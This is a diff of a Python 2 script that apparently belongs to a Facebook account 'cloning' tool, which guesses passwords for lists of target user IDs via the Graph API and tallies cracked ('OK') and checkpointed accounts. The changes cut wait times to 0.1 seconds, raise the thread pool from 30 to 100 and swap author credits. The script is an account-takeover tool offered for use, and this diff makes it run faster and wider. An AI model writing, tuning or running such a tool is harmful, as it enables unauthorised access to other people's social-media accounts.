@@ -12,7 +12,7 @@ reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=000.1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 
@@ -62,7 +62,7 @@ logo = """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(000.1)
 
 
 back = 0
@@ -104,7 +104,7 @@ while (loop == 'true'):
     	password = raw_input("\033[1;91m🗝 \x1b[1;95mTool Password \x1b[1;91m»» \x1b[1;91m")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username #Dev:love_hacker
-	    time.sleep(2)
+	    time.sleep(000.1)
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
@@ -161,12 +161,12 @@ def login():
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mAisa lagta hai apka account checkpoint pe hai")
 			os.system('rm -rf login.txt')
-			time.sleep(1)
+			time.sleep(000.1)
 			keluar()
 		else:
 			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email ghalat hai")
 			os.system('rm -rf login.txt')
-			time.sleep(1)
+			time.sleep(000.1)
 			login()
 
 
@@ -178,7 +178,7 @@ def menu():
 		os.system('clear')
 		print"\x1b[1;91m[!] Token invalid"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(000.1)
 		login()
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
@@ -192,7 +192,7 @@ def menu():
 		os.system('clear')
 		print"\033[1;91mYour Account is on Checkpoint"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(000.1)
 		login()
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;92mThere is no internet connection"
@@ -239,7 +239,7 @@ def super():
 	except IOError:
 		print"\x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(000.1)
 		login()
 	os.system('clear')
 	print logo
@@ -290,7 +290,7 @@ def pilih_super():
 	jalan('\033[1;34;40m[✺] Please Wait...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(000.1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m◄════════════════════💥════════════════════►"
 
@@ -298,12 +298,12 @@ def pilih_super():
 	print  "  \033[1;92m ◄════════════════════💥════════════════════►" 
 
 	def main(arg):
-		global cekpoint,oks
+		global oks
 		user = arg
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:rana
+			pass #Dev:jam
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -468,12 +468,12 @@ def pilih_super():
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(100)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mJAM-SHAHRUKH\033[1;95m◈•▬ ▬ ▬•◈•"
 	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 jam.py)↩\033[1;97m....'
-	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
+	print"\033[1;92mTotal OK/\033[1;92m: \033[1;92m"+str(len(oks))
 	print """
 
 ░░░░░██╗░█████╗░███╗░░░███╗
